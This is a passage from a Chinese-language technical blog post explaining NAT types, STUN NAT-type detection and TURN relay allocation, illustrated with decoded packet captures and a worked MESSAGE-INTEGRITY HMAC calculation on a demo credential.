<li>动态地址分配；将私网地址动态映射到外部地址池中的一个地址。使用时无需静态的配置路由器，但必须有足够的公网IP地址，让连接到因特网的主机都能够同时发送和接收分组。</li>
</ul>
</li>
<li><em>通过地址转换实现透明路由（只转发包，不交换路由信息）</em>，分为三个阶段：<ol>
<li>地址绑定：在新会话的开始分配地址，并创建一个状态，以促进与会话相关的数据报的转换。</li>
<li>地址查找与转换：一旦为会话建立了状态，属于该会话的所有包都将进行地址查找和转换。</li>
<li>地址解绑：当NAT设备认为使用地址绑定的最后一个会话已经终止时，它将执行地址解除绑定。</li>
</ol>
</li>
<li><em>ICMP错误数据包载荷转换</em>：为了让NAT设备对终端主机完全透明，IP、传输层以及ICMP包头中的地址和校验和都必须被修改。</li>
</ul>
<h1 id="NAT变体"><a href="#NAT变体" class="headerlink" title="NAT变体"></a>NAT变体</h1><p><a href="https://www.rfc-editor.org/rfc/rfc2663">RFC2663 IP Network Address Translator (NAT) Terminology and Considerations (1999)</a></p>
<table>
  <tr>
    <td colspan="3">
      <b>名称</b>
    </td>
    <td colspan="5">
      <b>特征</b>
    </td>
  </tr>
  <tr>
    <td colspan="3">
      Traditional NAT / Outbound NAT
    </td>
    <td colspan="5">
      会话只允许从内部主机发起。
    </td>
  </tr>
  <tr>
    <td colspan="1">
    </td>
    <td colspan="2">
      Basic NAT / one-to-one NAT
    </td>
    <td colspan="5">
      只转换 IP、UDP、TCP、ICMP 包头中的 IP 地址。
    </td>
  </tr>
  <tr>
    <td colspan="1">
    </td>
    <td colspan="2">
      Network Address Port Translation (NAPT) / one-to-many NAT / Port Address Translation (PAT) / IP masquerading / NAT overload
    </td>
    <td colspan="5">
      进一步扩展了转换的概念，例如 TCP 和 UDP 端口、ICMP 查询标识符等也被转换。
    </td>
  </tr>
  <tr>
    <td colspan="3">
      Two-Way NAT / Bi-directional NAT
    </td>
    <td colspan="5">
      会话既能从内部主机发起，也能从外部主机发起。
    </td>
  </tr>
  <tr>
    <td colspan="3">
      Twice NAT
    </td>
    <td colspan="5">
      数据报跨越地址域时，源地址和目的地址都会被修改，应用于内部地址和外部地址有冲突的情况下。
    </td>
  </tr>
</table>

<h2 id="NAPT"><a href="#NAPT" class="headerlink" title="NAPT"></a>NAPT</h2><p><a href="https://www.rfc-editor.org/rfc/rfc3489">RFC3498 STUN - Simple Traversal of User Datagram Protocol (UDP) Through Network Address Translators (NATs) (2003)</a><br><a href="https://www.rfc-editor.org/rfc/rfc4787">RFC4787 Network Address Translation (NAT) Behavioral Requirements for Unicast UDP (2007)</a></p>
<p><img data-src="/images/Network/Network-Address-Port-Translation.jpg"></p>
<p><strong>NAPT实现分类</strong></p>
<ul>
<li>RFC3498 (分类部分定义不够清晰，已弃用)：<ul>
<li><strong>锥型</strong>（Cone）:<ul>
<li><strong>全锥型</strong>（Full Cone）：<br>内部主机向外打了一个洞，外网的任何主机都可以利用这个洞与它通信。</li>
<li><strong>限制锥型</strong>（Restricted Cone）：<br>内部主机向某一外部主机打了一个洞后，只有该外部主机才能利用这个洞。</li>
<li><strong>端口限制锥型</strong>（Port Restricted Cone）：<br>内部主机向外部主机上的某一程序（端口）打了一个洞，则只有该程序可以利用这个洞，其他的不行。</li>
</ul>
</li>
<li><strong>对称型</strong>（Symmetric）：<br>对称型NAT相当于对同一内部主机联系不同的外部主机时都需要打不同的洞。</li>
</ul>
</li>
<li>RFC4787：<ul>
<li><strong>地址和端口映射</strong>（Address and Port Mapping）：从内部主机发送包时。<ul>
<li><strong>Endpoint-Independent Mapping</strong>：<br>从内部主机发出的包，都会重用已分配的外部地址。例如 Full-Cone, Restricted-Cone, and Port-Restricted Cone NATs。</li>
<li><strong>Address-Dependent Mapping</strong>：<br>当内部主机发出的包中<strong>目的IP不变</strong>时，已分配的外部地址才会重用。例如 Symmetric NAT。</li>
<li><strong>Address and Port-Dependent Mapping</strong>：<br>当内部主机发出的包中<strong>目的IP&amp;port不变</strong>时，已分配的外部地址才会重用。例如 Symmetric NAT。</li>
</ul>
</li>
<li><strong>过滤行为</strong>（Filtering Behavior）：外部主机应答包回来时。<ul>
<li><strong>Endpoint-Independent Filtering</strong>：<br>外部地址上收到的任何包，都会被转发到内部主机上。例如 Full-Cone NAT。</li>
<li><strong>Address-Dependent Filtering</strong>：<br>当外部地址曾经向应答包中<strong>源IP</strong>发送过数据，应答包才会被转发到内部主机上。Restricted-Cone NAT, Symmetric NAT。</li>
<li><strong>Address and Port-Dependent Filtering</strong>：<br>当外部地址曾经向应答包中<strong>源IP&amp;port</strong>发送过数据，应答包才会被转发到内部主机上。Port-Restricted Cone NAT, Symmetric NAT。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Two-Way-NAT"><a href="#Two-Way-NAT" class="headerlink" title="Two-Way NAT"></a>Two-Way NAT</h2><p>NAT内部的私有地址映射为外部的公网地址。PAT (Port address translation)解决了多台主机同时使用同一个源端口号建立不同的外部连接时的冲突问题。</p>
<p><img data-src="/images/Network/Bidirectional-NAT.png"></p>
<h1 id="STUN协议"><a href="#STUN协议" class="headerlink" title="STUN协议"></a>STUN协议</h1><p><a href="https://www.rfc-editor.org/rfc/rfc3489">RFC3498 STUN - Simple Traversal of User Datagram Protocol (UDP) Through Network Address Translators (NATs) (2003)</a><br><a href="https://www.rfc-editor.org/rfc/rfc5389">RFC5389 Session Traversal Utilities for NAT (STUN) (2008)</a><br><a href="https://www.rfc-editor.org/rfc/rfc7635">RFC7635 Session Traversal Utilities for NAT (STUN) Extension for Third-Party Authorization (2015)</a></p>
<p>STUN适用于锥型NAT：full cone NAT, restricted cone NAT, and port restricted cone NAT。（不适用 symmetric NAT）。</p>
<p>STUN是client-server协议，client和server之间可能存在一个或多个NATs，请求有两种类型:</p>
<ul>
<li>Binding Requests, sent over UDP;</li>
<li>Shared Secret Requests, sent over TLS over TCP.</li>
</ul>
<p>Server端部署在公网上，收到的请求中源地址是最靠近Server的NAT分配的，应支持如下四种应答：<br>  (A1, P1), (A2, P1), (A1, P2), and (A2, P2)。<br>  其中(A1, P1)是主地址和端口，端口默认3478。A2和P2可以是任意的值。</p>
<p>Client端发起请求：</p>
<ol>
<li>区分锥型还是对称型：<br>分别往A1和A2发送请求，如果这两次应答中MAPPED-ADDRESS一致，<br>说明同一内部主机联系外部不同主机使用了同一个洞，是锥型NAT。否则，是对称型NAT。</li>
<li>区分具体锥型：<br>往(A1,P1)发送三次请求：x、y、z，其中x无附加属性，y要求从(A2,P2)应答，z要求从(A1,P2)应答。<br>首先能收到x的应答，说明存在锥型NAT。否则，存在防火墙（应答包被防火墙拦截了）；<br>其次能收到y的应答，说明存在全锥型NAT。否则，不存在全锥型NAT，需要继续观察z的应答；<br>最后能收到z的应答，说明存在限制锥型NAT。否则，存在端口限制锥型NAT。</li>
</ol>
<p>Firewall通常规则：</p>
<ol>
<li>只允许从内部主机发起会话；</li>
<li>按照一定规则过滤外部主机应答的数据包。<ul>
<li>应答包的源IP必须是请求包的目的IP；</li>
<li>应答包的源IP&amp;Port必须是请求包的目的IP&amp;Port（此时也可称为symmetric Firewall）；</li>
</ul>
</li>
</ol>
<p>示例：端口限制锥型NAT（Endpoint-Independent Mapping &amp; Address and Port-Dependent Filtering）</p>
<div class="tabs" id="stun"><ul class="nav-tabs"><li class="tab active"><a href="#stun-1">x:无附加</a></li><li class="tab"><a href="#stun-2">y:改变IP和Port</a></li><li class="tab"><a href="#stun-3">z:只改变Port</a></li><li class="tab"><a href="#stun-4">cone:发往不同IP</a></li></ul><div class="tab-content"><div class="tab-pane active" id="stun-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nternet Protocol Version 4, Src: 172.16.65.200, Dst: 198.211.120.59</span><br><span class="line">User Datagram Protocol, Src Port: 61229, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    [Response In: 434]</span><br><span class="line">    Message Type: 0x0001 (Binding Request)</span><br><span class="line">    Message Length: 0</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: f63bfd78d2034b16c3642e52</span><br><span class="line"></span><br><span class="line">Internet Protocol Version 4, Src: 198.211.120.59, Dst: 172.16.65.200</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 61229</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    [Request In: 389]</span><br><span class="line">    [Time: 0.249086000 seconds]</span><br><span class="line">    Message Type: 0x0101 (Binding Success Response)</span><br><span class="line">    Message Length: 48</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: f63bfd78d2034b16c3642e52</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        MAPPED-ADDRESS: 116.233.95.21:61229</span><br><span class="line">        RESPONSE-ORIGIN: 198.211.120.59:3478</span><br><span class="line">        OTHER-ADDRESS: 188.166.128.84:3479</span><br><span class="line">        XOR-MAPPED-ADDRESS: 116.233.95.21:61229</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stun-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Internet Protocol Version 4, Src: 172.16.65.200, Dst: 198.211.120.59</span><br><span class="line">User Datagram Protocol, Src Port: 61229, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0001 (Binding Request)</span><br><span class="line">    Message Length: 8</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: dff9628084313db04b15dd39</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        CHANGE_REQUEST</span><br><span class="line">            Attribute Type: CHANGE_REQUEST</span><br><span class="line">            Attribute Length: 4</span><br><span class="line">            .... .... .... .1.. = Change IP: Set</span><br><span class="line">            .... .... .... ..1. = Change Port: Set</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stun-3"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Internet Protocol Version 4, Src: 172.16.65.200, Dst: 198.211.120.59</span><br><span class="line">User Datagram Protocol, Src Port: 61229, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0001 (Binding Request)</span><br><span class="line">    Message Length: 8</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 27deb059a9869569a8856d91</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        CHANGE_REQUEST</span><br><span class="line">            Attribute Type: CHANGE_REQUEST</span><br><span class="line">            Attribute Length: 4</span><br><span class="line">            .... .... .... .0.. = Change IP: Not set</span><br><span class="line">            .... .... .... ..1. = Change Port: Set</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="stun-4"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Internet Protocol Version 4, Src: 172.16.65.200, Dst: 188.166.128.84</span><br><span class="line">User Datagram Protocol, Src Port: 61229, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    [Response In: 704]</span><br><span class="line">    Message Type: 0x0001 (Binding Request)</span><br><span class="line">    Message Length: 0</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: af5441b8222139230b90938a</span><br><span class="line"></span><br><span class="line">Internet Protocol Version 4, Src: 188.166.128.84, Dst: 172.16.65.200</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 61229</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    [Request In: 673]</span><br><span class="line">    [Time: 0.248904000 seconds]</span><br><span class="line">    Message Type: 0x0101 (Binding Success Response)</span><br><span class="line">    Message Length: 48</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: af5441b8222139230b90938a</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        MAPPED-ADDRESS: 116.233.95.21:61229</span><br><span class="line">        RESPONSE-ORIGIN: 188.166.128.84:3478</span><br><span class="line">        OTHER-ADDRESS: 198.211.120.59:3479</span><br><span class="line">        XOR-MAPPED-ADDRESS: 116.233.95.21:61229</span><br></pre></td></tr></table></figure></div></div></div>

<p>NAT类型探测算法（实际场景中不够可靠）：</p>
<p><img data-src="/images/Network/STUN-NATDetectAlgorithm.svg"></p>
<h1 id="P2P穿越NAT"><a href="#P2P穿越NAT" class="headerlink" title="P2P穿越NAT"></a>P2P穿越NAT</h1><p><a href="https://www.rfc-editor.org/rfc/rfc5128">RFC5128 State of Peer-to-Peer (P2P) Communication across Network Address Translators (NATs) (2008)</a></p>
<p>打洞（hole punching）技术尝试发现直接连接路径，而不使用中继（Relay），但打洞技术不适用于通信两端均在NAT内的情况。</p>
<h1 id="UPnP协议"><a href="#UPnP协议" class="headerlink" title="UPnP协议"></a>UPnP协议</h1><p><a href="https://openconnectivity.org/developer/specifications/upnp-resources/upnp">UPnP Standards &amp; Architecture</a></p>
<p>通用即插即用（Universal Plug and Play），用来在NAT设备上打洞，需要NAT设备支持。</p>
<h1 id="NAT-PMP协议"><a href="#NAT-PMP协议" class="headerlink" title="NAT-PMP协议"></a>NAT-PMP协议</h1><p><a href="https://www.rfc-editor.org/rfc/rfc6886">RFC6886 NAT Port Mapping Protocol (NAT-PMP) (2013)</a></p>
<p>NAT端口映射协议（NAT Port Mapping Protocol），用来在NAT设备上打洞，需要NAT设备支持。</p>
<h1 id="RSIP"><a href="#RSIP" class="headerlink" title="RSIP"></a>RSIP</h1><p><a href="https://www.rfc-editor.org/rfc/rfc3102">RFC3102 Realm Specific IP: Framework (2001)</a></p>
<h1 id="symmetric-RTP"><a href="#symmetric-RTP" class="headerlink" title="symmetric RTP"></a>symmetric RTP</h1><h1 id="TRUN协议"><a href="#TRUN协议" class="headerlink" title="TRUN协议"></a>TRUN协议</h1><p><a href="https://www.rfc-editor.org/rfc/rfc5766">RFC5766 Traversal Using Relays around NAT (TURN): Relay Extensions to Session Traversal Utilities for NAT (STUN) (2010)</a><br><a href="https://www.rfc-editor.org/rfc/rfc7065">RFC7065 Traversal Using Relays around NAT (TURN) Uniform Resource Identifiers (2013)</a><br><a href="https://www.rfc-editor.org/rfc/rfc8656">RFC8656 Traversal Using Relays around NAT (TURN): Relay Extensions to Session Traversal Utilities for NAT (STUN) (2020)</a></p>
<p>TRUN适用于解决如下NAT场景：</p>
<ol>
<li>对称型（symmetric）NAT。</li>
<li>通信两端（TURN&#x2F;client和peer）都在NAT内时，使用中继（TURN&#x2F;server）在两端之间互相转发流量。</li>
</ol>
<p>TURN缺点：</p>
<ol>
<li>通讯性能会受限于TRUN&#x2F;Server的处理能力和带宽；</li>
<li>增加了通信延迟。</li>
</ol>
<p>TURN模型：</p>
<pre><code>TURN/Client --NAT-- TURN/Server(XOR-RELAYED-ADDRESS) -- PeerA/B/..
TURN/Client --NAT-- TURN/Server(XOR-RELAYED-ADDRESS) --NAT-- PeerA/B/..
</code></pre>
<table>
<thead>
<tr>
<th align="left">TURN&#x2F;client to TURN&#x2F;server</th>
<th align="left">TURN&#x2F;server to peer</th>
</tr>
</thead>
<tbody><tr>
<td align="left">UDP</td>
<td align="left">UDP</td>
</tr>
<tr>
<td align="left">TCP</td>
<td align="left">UDP</td>
</tr>
<tr>
<td align="left">TLS-over-TCP</td>
<td align="left">UDP</td>
</tr>
<tr>
<td align="left">DTLS-over-UDP</td>
<td align="left">UDP</td>
</tr>
</tbody></table>
<ol>
<li><strong>分配中继地址</strong></li>
</ol>
<p>TURN&#x2F;Client向TURN&#x2F;Server申请分配器（Allocation），申请成功后需要定期保活，一个Allocation可以同时与多个peer交换数据，分配器与中继地址（XOR-RELAYED-ADDRESS）一一对应。</p>
<pre><code>    TURN                                           TURN          Peer         Peer
    client                                         server         A            B
      |-- Allocate request -------------------------&gt;|            |            |
      |   (invalid or missing credentials)           |            |            |
      |                                              |            |            |
      |&lt;--------------- Allocate failure ------------|            |            |
      |              (401 Unauthenticated)           |            |            |
      |                                              |            |            |
      |-- Allocate request -------------------------&gt;|            |            |
      |               (valid credentials)            |            |            |
      |                                              |            |            |
      |&lt;---------- Allocate success resp ------------|            |            |
      | (XOR-RELAYED-ADDRESS: 192.168.5.220:58067)   |            |            |
      //                                             //           //           //
      |                                              |            |            |
      |-- Refresh request --------------------------&gt;|            |            |
      |                                              |            |            |
      |&lt;----------- Refresh success resp ------------|            |            |
      |                                              |            |            |
</code></pre>
<div class="tabs" id="turn-allocation"><ul class="nav-tabs"><li class="tab active"><a href="#turn-allocation-1">allocate:401</a></li><li class="tab"><a href="#turn-allocation-2">allocate:create</a></li><li class="tab"><a href="#turn-allocation-3">refresh:update</a></li><li class="tab"><a href="#turn-allocation-4">refresh:delete</a></li></ul><div class="tab-content"><div class="tab-pane active" id="turn-allocation-1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 请求分配中继地址（无认证）</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0003 (Allocate Request)</span><br><span class="line">    Message Length: 36</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 3e0ca382ceb0e6c6dc87ef32</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        REQUESTED-TRANSPORT: UDP</span><br><span class="line">        LIFETIME 777</span><br><span class="line">        RESERVATION-TOKEN: c15f9f750002d641</span><br><span class="line">        FINGERPRINT: 0x63df9cea</span><br><span class="line"></span><br><span class="line"># STUN-Server: 要求认证机制</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0113 (Allocate Error Response)</span><br><span class="line">    Message Length: 104</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 3e0ca382ceb0e6c6dc87ef32</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        ERROR-CODE 401 (Unauthenticated): Unauthorized</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        FINGERPRINT: 0xfa3e2c47</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="turn-allocation-2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MESSAGE-INTEGRITY属性 (HMAC-SHA1算法):</span><br><span class="line">    For STUN&#x27;s long-term credentials (RFC5389长期认证):</span><br><span class="line">        key = MD5(username &quot;:&quot; realm &quot;:&quot; SASLprep(password)) </span><br><span class="line">            = MD5(coturn:coturn.imssyang.com:coturn)</span><br><span class="line">            = echo -n coturn:coturn.imssyang.com:coturn | md5sum</span><br><span class="line">            = 14d71486bdbb3b7ef8035128bf8df039</span><br><span class="line">    For STUN&#x27;s short-term credentials (RFC5389短期认证):</span><br><span class="line">        key = SASLprep(password)</span><br><span class="line"></span><br><span class="line"># STUN-Client: 请求分配中继地址（长期认证机制）</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0003 (Allocate Request)</span><br><span class="line">    Message Length: 116</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 7e193858930002b5196d44c3</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        REQUESTED-TRANSPORT: UDP</span><br><span class="line">        LIFETIME 777</span><br><span class="line">        RESERVATION-TOKEN: c15f9f750002d641</span><br><span class="line">        USERNAME: coturn</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        MESSAGE-INTEGRITY: 95c6d5ae051931f9af7085a2e07ceb97afb16fa7</span><br><span class="line">        FINGERPRINT: 0x0e2f95dc</span><br><span class="line"></span><br><span class="line">    0000   00 03 00&gt;74 21 12 a4 42 7e 19 38 58 93 00 02 b5   ...t!..B~.8X....</span><br><span class="line">    0010   19 6d 44 c3 00 19 00 04 11 00 00 00 00 0d 00 04   .mD.............</span><br><span class="line">    0020   00 00 03 09 00 22 00 08 c1 5f 9f 75 00 02 d6 41   .....&quot;..._.u...A</span><br><span class="line">    0030   00 06 00 06 63 6f 74 75 72 6e 34 63 00 15 00 10   ....coturn4c....</span><br><span class="line">    0040   62 65 65 33 37 34 65 36 62 63 38 62 64 33 35 32   bee374e6bc8bd352</span><br><span class="line">    0050   00 14 00 13 63 6f 74 75 72 6e 2e 69 6d 73 73 79   ....coturn.imssy</span><br><span class="line">    0060   61 6e 67 2e 63 6f 6d 29&gt;00 08 00 14 95 c6 d5 ae   ang.com)........</span><br><span class="line">    0070   05 19 31 f9 af 70 85 a2 e0 7c eb 97 af b1 6f a7   ..1..p...|....o.</span><br><span class="line">    0080   80 28 00 04 0e 2f 95 dc                           .(.../..</span><br><span class="line"></span><br><span class="line">    # STUN消息(1.bin)，用于计算MESSAGE-INTEGRITY属性的值:</span><br><span class="line">    # 1.去掉MESSAGE-INTEGRITY（含）之后属性的数据；</span><br><span class="line">    # 2.修改MessageLength值，去除掉MESSAGE-INTEGRITY（不含）之后属性的大小；</span><br><span class="line">    0000   00 03 00 6C 21 12 a4 42 7e 19 38 58 93 00 02 b5   ...t!..B~.8X....</span><br><span class="line">    0010   19 6d 44 c3 00 19 00 04 11 00 00 00 00 0d 00 04   .mD.............</span><br><span class="line">    0020   00 00 03 09 00 22 00 08 c1 5f 9f 75 00 02 d6 41   .....&quot;..._.u...A</span><br><span class="line">    0030   00 06 00 06 63 6f 74 75 72 6e 34 63 00 15 00 10   ....coturn4c....</span><br><span class="line">    0040   62 65 65 33 37 34 65 36 62 63 38 62 64 33 35 32   bee374e6bc8bd352</span><br><span class="line">    0050   00 14 00 13 63 6f 74 75 72 6e 2e 69 6d 73 73 79   ....coturn.imssy</span><br><span class="line">    0060   61 6e 67 2e 63 6f 6d 29                           ang.com)</span><br><span class="line">    openssl dgst -sha1 -mac HMAC -macopt hexkey:14d71486bdbb3b7ef8035128bf8df039 1.bin</span><br><span class="line">    HMAC-SHA1(1.bin)= 95c6d5ae051931f9af7085a2e07ceb97afb16fa7</span><br><span class="line"></span><br><span class="line"># STUN-Server: 成功分配中继地址（一个中继地址可以同时与多个peer交换数据）</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0103 (Allocate Success Response)</span><br><span class="line">    Message Length: 96</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 7e193858930002b5196d44c3</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        XOR-RELAYED-ADDRESS: 192.168.5.220:58067  #中继地址</span><br><span class="line">        XOR-MAPPED-ADDRESS: 192.168.5.220:37740</span><br><span class="line">        LIFETIME 777</span><br><span class="line">        MESSAGE-INTEGRITY: 0c4eea2bd8d7d06e1a3321da8e68bf3d9a3d6c2d</span><br><span class="line">        FINGERPRINT: 0xaa922dfd</span><br><span class="line"></span><br><span class="line">    0000   01 03 00&gt;60 21 12 a4 42 7e 19 38 58 93 00 02 b5   ...`!..B~.8X....</span><br><span class="line">    0010   19 6d 44 c3 00 16 00 08 00 01 c3 c1 e1 ba a1 9e   .mD.............</span><br><span class="line">    0020   00 20 00 08 00 01 b2 7e e1 ba a1 9e 00 0d 00 04   . .....~........</span><br><span class="line">    0030   00 00 03 09 80 22 00 1a 43 6f 74 75 72 6e 2d 34   .....&quot;..Coturn-4</span><br><span class="line">    0040   2e 35 2e 31 2e 33 20 27 64 61 6e 20 45 69 64 65   .5.1.3 &#x27;dan Eide</span><br><span class="line">    0050   72 27 00 00&gt;00 08 00 14 0c 4e ea 2b d8 d7 d0 6e   r&#x27;.......N.+...n</span><br><span class="line">    0060   1a 33 21 da 8e 68 bf 3d 9a 3d 6c 2d 80 28 00 04   .3!..h.=.=l-.(..</span><br><span class="line">    0070   aa 92 2d fd                                       ..-.</span><br><span class="line"></span><br><span class="line">    # STUN消息(2.bin)，用于计算MESSAGE-INTEGRITY属性的值:</span><br><span class="line">    # 1.去掉MESSAGE-INTEGRITY（含）之后属性的数据；</span><br><span class="line">    # 2.修改MessageLength值，去除掉MESSAGE-INTEGRITY（不含）之后属性的大小；</span><br><span class="line">    0000   01 03 00 58 21 12 a4 42 7e 19 38 58 93 00 02 b5   ...`!..B~.8X....</span><br><span class="line">    0010   19 6d 44 c3 00 16 00 08 00 01 c3 c1 e1 ba a1 9e   .mD.............</span><br><span class="line">    0020   00 20 00 08 00 01 b2 7e e1 ba a1 9e 00 0d 00 04   . .....~........</span><br><span class="line">    0030   00 00 03 09 80 22 00 1a 43 6f 74 75 72 6e 2d 34   .....&quot;..Coturn-4</span><br><span class="line">    0040   2e 35 2e 31 2e 33 20 27 64 61 6e 20 45 69 64 65   .5.1.3 &#x27;dan Eide</span><br><span class="line">    0050   72 27 00 00                                       r&#x27;..</span><br><span class="line">    openssl dgst -sha1 -mac HMAC -macopt hexkey:14d71486bdbb3b7ef8035128bf8df039 2.bin</span><br><span class="line">    HMAC-SHA1(2.bin)= 0c4eea2bd8d7d06e1a3321da8e68bf3d9a3d6c2d</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="turn-allocation-3"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 刷新分配器（默认10min）</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0004 (Refresh Request)</span><br><span class="line">    Message Length: 96</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 9c6d4a9ce32a3f736b81dd9e</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        LIFETIME 777</span><br><span class="line">        USERNAME: coturn</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        MESSAGE-INTEGRITY: 2ac92db74c84bb04b421b9729c5aaae4dab07a5e</span><br><span class="line">        FINGERPRINT: 0x75c5bcec</span><br><span class="line"></span><br><span class="line"># STUN-Server: 返回分配器生存时长</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0104 (Refresh Success Response)</span><br><span class="line">    Message Length: 72</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: 9c6d4a9ce32a3f736b81dd9e</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        LIFETIME 777</span><br><span class="line">        MESSAGE-INTEGRITY: 16d7ec9bf612b3c76eece5da86e0ed4c10ddb9f5</span><br><span class="line">        FINGERPRINT: 0x2e133e0d</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="turn-allocation-4"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STUN-Client: 删除分配器（lifetime:0）</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 37740, Dst Port: 3478</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0004 (Refresh Request)</span><br><span class="line">    Message Length: 96</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: e06a8c2bf1d595a5e9cbfe52</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        LIFETIME 0</span><br><span class="line">        USERNAME: coturn</span><br><span class="line">        NONCE: bee374e6bc8bd352</span><br><span class="line">        REALM: coturn.imssyang.com</span><br><span class="line">        MESSAGE-INTEGRITY: aed33a6523af34156e86daab67f4ce490b82ff93</span><br><span class="line">        FINGERPRINT: 0x51fc337d</span><br><span class="line"></span><br><span class="line"># STUN-Server: 成功删除分配器</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.5.220, Dst: 192.168.5.220</span><br><span class="line">User Datagram Protocol, Src Port: 3478, Dst Port: 37740</span><br><span class="line">Session Traversal Utilities for NAT</span><br><span class="line">    Message Type: 0x0104 (Refresh Success Response)</span><br><span class="line">    Message Length: 72</span><br><span class="line">    Message Cookie: 2112a442</span><br><span class="line">    Message Transaction ID: e06a8c2bf1d595a5e9cbfe52</span><br><span class="line">    [STUN Network Version: RFC-5389/8489 (3)]</span><br><span class="line">    Attributes</span><br><span class="line">        LIFETIME 0</span><br><span class="line">        MESSAGE-INTEGRITY: 3cd13624b951fdc538d7a60ba4369e8eae24173a</span><br><span class="line">        FINGERPRINT: 0x189862a6</span><br></pre></td></tr></table></figure></div></div></div>

